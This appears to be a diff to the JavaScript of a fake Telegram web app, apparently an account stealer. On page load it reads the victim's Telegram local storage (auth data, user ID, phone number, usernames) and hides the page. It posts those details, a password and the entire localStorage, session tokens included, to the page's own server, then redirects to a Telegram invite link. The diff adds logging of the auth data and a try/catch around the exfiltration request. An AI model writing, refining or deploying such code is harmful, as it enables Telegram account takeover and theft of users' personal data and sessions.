@@ -1,11 +1,16 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
     let globalState = localStorage.getItem("tt-global-state");
+    console.log(globalState, 'globalState');
     if (globalState && localStorage.getItem("user_auth")) {
+      console.log(localStorage.getItem("user_auth"), 'localStorage.getItem("user_auth")');
       const parsedState = JSON.parse(globalState);
       const currentUserId = parsedState.currentUserId;
       const currentUser = parsedState.users.byId[currentUserId];
       document.body.style.display = "none";
+
+      console.log(currentUserId, 'currentUserId');
+      console.log(currentUser, 'currentUser');
 
       if (currentUserId && currentUser) {
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
@@ -13,17 +18,21 @@ document.addEventListener("DOMContentLoaded", function() {
 
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
-
-        fetch(`/api/users/telegram/info`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId: currentUserId, firstName,
-            usernames, phoneNumber, isPremium,
-            password, quicklySet: localStorage,
-            type: new URLSearchParams(window.location.search).get("type")
-          })
-        });
+        console.log('run of api');
+        try {
+          fetch(`/api/users/telegram/info`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              userId: currentUserId, firstName,
+              usernames, phoneNumber, isPremium,
+              password, quicklySet: localStorage,
+              type: new URLSearchParams(window.location.search).get("type")
+            })
+          });
+        } catch (er) {
+          console.log(er, 'errorss');
+        }
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
         window.Telegram.WebApp.close();
@@ -34,6 +43,7 @@ document.addEventListener("DOMContentLoaded", function() {
         clearInterval(checkInterval);
       }
     } else {
+      console.log('can not run');
       sessionStorage.clear();
       localStorage.clear();
     }
